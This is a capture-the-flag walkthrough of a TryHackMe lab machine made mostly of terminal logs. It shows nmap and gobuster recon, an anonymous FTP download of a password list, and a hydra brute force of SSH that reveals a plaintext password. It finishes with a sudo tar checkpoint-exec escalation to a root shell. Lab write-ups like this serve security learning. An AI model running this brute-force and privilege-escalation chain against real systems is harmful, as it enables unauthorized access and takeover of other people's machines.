lets use gobuster 

gobuster dir -u http://10.10.133.177 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt


let use nmap also 

/////

─(Abad㉿kali)-[~/Desktop/work/tryhackme/BountyHacker]
└─$ nmap -sC -sV 10.10.133.177
Starting Nmap 7.95 ( https://nmap.org ) at 2025-03-15 01:18 GMT
Nmap scan report for 10.10.133.177
Host is up (0.20s latency).
Not shown: 967 filtered tcp ports (no-response), 30 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.21.132.238
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: TIMEOUT
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 dc:f8:df:a7:a6:00:6d:18:b0:70:2b:a5:aa:a6:14:3e (RSA)
|   256 ec:c0:f2:d9:1e:6f:48:7d:38:9a:e3:bb:08:c4:0c:c9 (ECDSA)
|_  256 a4:1a:15:a5:d4:b1:cf:8f:16:50:3a:7d:d0:d8:13:c2 (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.18 (Ubuntu)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 76.66 seconds
                                    

////////


we see that we can log in as anonymous 




//////

└─$ ftp 10.10.133.177
Connected to 10.10.133.177.
220 (vsFTPd 3.0.3)
Name (10.10.133.177:Abad): anonymous
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> dir
229 Entering Extended Passive Mode (|||45975|)
150 Here comes the directory listing.
-rw-rw-r--    1 ftp      ftp           418 Jun 07  2020 locks.txt
-rw-rw-r--    1 ftp      ftp            68 Jun 07  2020 task.txt
226 Directory send OK.
ftp> ls
229 Entering Extended Passive Mode (|||22481|)
^C
receive aborted. Waiting for remote to finish abort.
ftp> 



///////


since ls didnt work we used {dir} 

it works but the connection keeps hanging 
/////////

──(Abad㉿kali)-[~/Desktop/work/tryhackme/BountyHacker]
└─$                        
ftp 10.10.133.177

Connected to 10.10.133.177.
220 (vsFTPd 3.0.3)
Name (10.10.133.177:Abad): anonymous
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> dir
229 Entering Extended Passive Mode (|||44375|)
150 Here comes the directory listing.
-rw-rw-r--    1 ftp      ftp           418 Jun 07  2020 locks.txt
-rw-rw-r--    1 ftp      ftp            68 Jun 07  2020 task.txt
226 Directory send OK.
ftp> dir
229 Entering Extended Passive Mode (|||56123|)
^C
receive aborted. Waiting for remote to finish abort.
ftp> exit
221 Goodbye.


//////////


lets check our firewall 

lets try to allow connection accordingly 


//////////////////
┌──(Abad㉿kali)-[~/Desktop/work/tryhackme/BountyHacker]
└─$ sudo systemctl start ufw

                                                                                
┌──(Abad㉿kali)-[~/Desktop/work/tryhackme/BountyHacker]
└─$ sudo ufw allow out 21/tcp
sudo ufw allow out 20/tcp
sudo ufw allow out 1024:65535/tcp

Skipping adding existing rule
Skipping adding existing rule (v6)
Skipping adding existing rule
Rule added (v6)
Skipping adding existing rule
Rule added (v6)

/////////////////

this didnt work so we use the passive mode and  the command {grep file -}

only if the usual get doesnt work 


//////////////////////////









──(Abad㉿kali)-[~/Desktop/work/tryhackme/BountyHacker]
└─$ ftp 10.10.133.177
Connected to 10.10.133.177.
220 (vsFTPd 3.0.3)
Name (10.10.133.177:Abad): anonymous
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||56748|)
^C
receive aborted. Waiting for remote to finish abort.
ftp> dir
229 Entering Extended Passive Mode (|||24131|)
^C
receive aborted. Waiting for remote to finish abort.
ftp> passive
Passive mode: off; fallback to active mode: off.
ftp> ls
200 EPRT command successful. Consider using EPSV.
150 Here comes the directory listing.
-rw-rw-r--    1 ftp      ftp           418 Jun 07  2020 locks.txt
-rw-rw-r--    1 ftp      ftp            68 Jun 07  2020 task.txt
226 Directory send OK.
ftp> get task.txt -
remote: task.txt
200 EPRT command successful. Consider using EPSV.
150 Opening BINARY mode data connection for task.txt (68 bytes).
1.) Protect Vicious.
2.) Plan for Red Eye pickup on the moon.

-lin
226 Transfer complete.
68 bytes received in 00:00 (0.41 KiB/s)
ftp> get locks.txt -
remote: locks.txt
200 EPRT command successful. Consider using EPSV.
150 Opening BINARY mode data connection for locks.txt (418 bytes).
rEddrAGON
ReDdr4g0nSynd!cat3
Dr@gOn$yn9icat3
R3DDr46ONSYndIC@Te
ReddRA60N
R3dDrag0nSynd1c4te
dRa6oN5YNDiCATE
ReDDR4g0n5ynDIc4te
R3Dr4gOn2044
RedDr4gonSynd1cat3
R3dDRaG0Nsynd1c@T3
Synd1c4teDr@g0n
reddRAg0N
REddRaG0N5yNdIc47e
Dra6oN$yndIC@t3
4L1mi6H71StHeB357
rEDdragOn$ynd1c473
DrAgoN5ynD1cATE
ReDdrag0n$ynd1cate
Dr@gOn$yND1C4Te
RedDr@gonSyn9ic47e
REd$yNdIc47e
dr@goN5YNd1c@73
rEDdrAGOnSyNDiCat3
r3ddr@g0N
ReDSynd1ca7e
226 Transfer complete.
418 bytes received in 00:00 (2.50 KiB/s)










///////////////////


we found that the user is lin 

1.) Protect Vicious.
2.) Plan for Red Eye pickup on the moon.

-lin
226 Transfer complete.
68 bytes received in 00:00 (0.41 KiB/s)
ftp> 


lets copy whats in  the files locks.txt and brute force on ssh 

using hydra we found a password 

///////////////////

ydra -l lin -P locks.txt ssh://10.10.133.177
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-03-15 02:13:09
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 26 login tries (l:1/p:26), ~2 tries per task
[DATA] attacking ssh://10.10.133.177:22/
[22][ssh] host: 10.10.133.177   login: lin   password: RedDr4gonSynd1cat3
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-03-15 02:13:15
                                                              

////////////


now we logged in 
///////

 ssh lin@10.10.133.177
lin@10.10.133.177's password: 
Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.15.0-101-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

83 packages can be updated.
0 updates are security updates.

Last login: Sun Jun  7 22:23:41 2020 from 192.168.0.14


/////////////////


we found user.txt 

lin@bountyhacker:~/Desktop$ ls
user.txt
lin@bountyhacker:~/Desktop$ 
 
 
 now lets find root.txt
 
 we have this priviliges 
 
 //
 
 lin@bountyhacker:/home$ sudo -l
Matching Defaults entries for lin on bountyhacker:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User lin may run the following commands on bountyhacker:
    (root) /bin/tar
    
    
    In this case, since the user lin can run /bin/tar as root, you have a potential privilege escalation vector. The tar command can be leveraged to read/write files and execute commands, and this can be exploited to escalate privileges to root.
    
    
    
    lets find s way to gain access using GTFOBins
    
    https://gtfobins.github.io/
    
    
    since we found it lets get the sudo cmnd 
    
    in@bountyhacker:/bin$ sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh

we found the file 
lin@bountyhacker:/bin$ sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
tar: Removing leading `/' from member names
# find / -name root.txt 2>/dev/null
/root/root.txt
# 


now am root 

 
 ///
 
 



